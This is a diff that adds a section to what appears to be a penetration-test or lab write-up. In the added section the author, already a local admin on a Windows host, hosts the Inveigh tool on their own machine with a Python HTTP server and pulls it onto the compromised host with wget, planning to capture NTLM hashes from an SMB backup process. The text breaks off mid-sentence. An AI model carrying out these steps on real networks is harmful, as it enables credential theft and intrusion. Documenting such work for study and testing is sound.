@@ -400,3 +400,27 @@ Since i am a local admin i am able to spawn a administrator session so now i can
 Remembering the backup procedure i already know there is a process where users connect to a SMB share i might be able to intercept NTLM hashes
 
 I can do this with inveigh
+
+## Using inveigh to capture NTLM hashes
+```python
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+This is hosting inveigh on my machine
+
+```python
+PS C:\Users\svc_netops\Documents> wget http://192.168.211.2:8000/Inveigh.exe -o inveigh.exe
+PS C:\Users\svc_netops\Documents> dir
+
+
+    Directory: C:\Users\svc_netops\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/8/2026   5:00 PM       14520681 inveigh.exe
+
+
+PS C:\Users\svc_netops\Documents>
+```
+This tranferred it to my mach
